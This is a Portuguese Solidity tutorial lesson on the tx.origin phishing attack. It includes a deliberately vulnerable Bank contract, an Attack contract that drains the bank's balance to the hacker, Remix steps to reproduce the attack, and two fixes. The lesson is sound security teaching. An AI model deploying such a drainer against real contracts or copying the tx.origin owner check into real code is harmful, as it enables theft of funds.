# WTF Solidity: S12. Ataque de Phishing tx.origin

Recentemente, tenho revisado meus conhecimentos em Solidity para consolidar os detalhes e também para escrever um "WTF Solidity Simplificado" para iniciantes (os programadores experientes podem procurar outros tutoriais). Estarei postando de 1 a 3 lições por semana.

Twitter: [@0xAA_Science](https://twitter.com/0xAA_Science) | [@WTFAcademy_](https://twitter.com/WTFAcademy_)

Comunidade: [Discord](https://discord.gg/5akcruXrsk) | [Grupo no WeChat](https://docs.google.com/forms/d/e/1FAIpQLSe4KGT8Sh6sJ7hedQRuIYirOoZK_85miz3dw7vA1-YjodgJ-A/viewform?usp=sf_link) | [Site Oficial wtf.academy](https://wtf.academy)

Todo o código e tutoriais são de código aberto no GitHub: [github.com/AmazingAng/WTFSolidity](https://github.com/AmazingAng/WTF-Solidity)

---

Nesta lição, vamos discutir o ataque de phishing tx.origin em contratos inteligentes e métodos para prevenir esse tipo de ataque.

## Ataque de Phishing com tx.origin

Quando eu estava no ensino fundamental, gostava muito de jogar videogame, mas os desenvolvedores, para evitar o vício de menores de idade, implementaram uma política em que apenas jogadores com mais de dezoito anos, verificados por meio de um número de identidade, poderiam jogar sem restrições. Como contornar essa política? Eu usei o número de identidade dos meus pais para verificar minha idade e consegui burlar o sistema. Esse caso se assemelha ao ataque de phishing com tx.origin.

No Solidity, o uso de `tx.origin` permite obter o endereço que iniciou a transação e é semelhante ao `msg.sender`. A diferença é que, se o usuário A chamar o contrato B, que por sua vez chama o contrato C, o `msg.sender` em C será o contrato B e o `tx.origin` será o usuário A. Para entender mais sobre o mecanismo de `call`, você pode ler a [S22. Chamada de Função](https://github.com/AmazingAng/WTF-Solidity/blob/main/22_Call/readme.md).

Dessa forma, se um contrato bancário usa `tx.origin` para autenticar a identidade, um hacker poderá implantar um contrato malicioso e induzir o proprietário do contrato a chamá-lo. Mesmo que o `msg.sender` seja o endereço do contrato malicioso, o `tx.origin` será o endereço do proprietário do contrato bancário, o que permitirá a realização de transferências.

## Exemplo de Contrato Vulnerável

### Contrato Bancário

Vamos analisar um contrato bancário simples, com uma variável de estado `owner` para registrar o proprietário do contrato. Ele possui um construtor e uma função pública:

- Construtor: atribui o valor de `msg.sender` à variável `owner` durante a criação do contrato.
- `transfer()`: esta função recebe os parâmetros `_to` e `_amount` e verifica se `tx.origin == owner` antes de transferir a quantidade `_amount` de ETH para o endereço `_to`. **Observação: essa função é vulnerável a ataques de phishing!**

```solidity
contract Bank {
    address public owner; // Armazena o proprietário do contrato

    // Atribui o valor de msg.sender à variável owner
    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint _amount) public {
        // Verifica a origem da mensagem !!! Existe um risco de phishing
        require(tx.origin == owner, "Not owner");
        // Transfere ETH
        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}
```

### Contrato Malicioso

Agora, vamos ver o contrato malicioso. Ele possui uma função `attack()` simples, que é usada para realizar o ataque de phishing, transferindo todo o saldo do contrato bancário para o endereço do hacker. O contrato possui duas variáveis de estado: `hacker` e `bank`, que armazenam o endereço do hacker e do contrato bancário a ser atacado, respectivamente.

Ele contém duas funções:

- Construtor: inicializa o endereço do contrato bancário.
- `attack()`: essa função é usada para induzir o proprietário do contrato bancário a chamar o contrato malicioso, que por sua vez chama a função `transfer()` do contrato bancário, verificando se `tx.origin == owner` e transferindo todo o saldo para o endereço do hacker.

```solidity
contract Attack {
    address payable public hacker;
    Bank bank;

    constructor(Bank _bank) {
        bank = Bank(_bank);
        hacker = payable(msg.sender);
    }

    function attack() public {
        bank.transfer(hacker, address(bank).balance);
    }
}
```

## Reproduzindo no `Remix`

**1.** Defina o `value` como 10 ETH, implante o contrato `Bank` e o endereço do proprietário `owner` será definido como o endereço do contrato implantado.

**2.** Mude para outra carteira, que será usada como a carteira do hacker, informe o endereço do contrato bancário a ser atacado e implante o contrato `Attack`, onde o endereço do hacker será definido como o endereço do contrato implantado.

**3.** Volte para o endereço `owner` e chame a função `attack()` do contrato `Attack`, induzindo a transferência de todo o saldo do contrato `Bank` para o endereço do hacker.

## Métodos de Prevenção

Atualmente, existem duas maneiras de prevenir o ataque de phishing com `tx.origin`:

### 1. Usar `msg.sender` em vez de `tx.origin`

`msg.sender` obtém o endereço do remetente direto da chamada atual ao contrato. Verificando o valor de `msg.sender`, você pode evitar chamadas maliciosas de contratos externos.

```solidity
function transfer(address payable _to, uint256 _amount) public {
  require(msg.sender == owner, "Not owner");

  (bool sent, ) = _to.call{value: _amount}("");
  require(sent, "Failed to send Ether");
}
```

### 2. Verificar `tx.origin == msg.sender`

Se você precisa usar `tx.origin`, verifique se `tx.origin` é igual a `msg.sender` para evitar chamadas maliciosas de contratos externos. Porém, essa abordagem rejeitará qualquer chamada de função feita por outros contratos.

```solidity
function transfer(address payable _to, uint _amount) public {
    require(tx.origin == owner, "Not owner");
    require(tx.origin == msg.sender, "can't call by external contract");
    (bool sent, ) = _to.call{value: _amount}("");
    require(sent, "Failed to send Ether");
}
```

## Conclusão

Nesta lição, abordamos o ataque de phishing com `tx.origin` em contratos inteligentes e métodos para prevenir esse tipo de ataque: usando `msg.sender` em vez de `tx.origin` ou verificando se `tx.origin == msg.sender`. A primeira abordagem é a mais recomendada, pois a segunda rejeitará chamadas de função feitas por outros contratos.

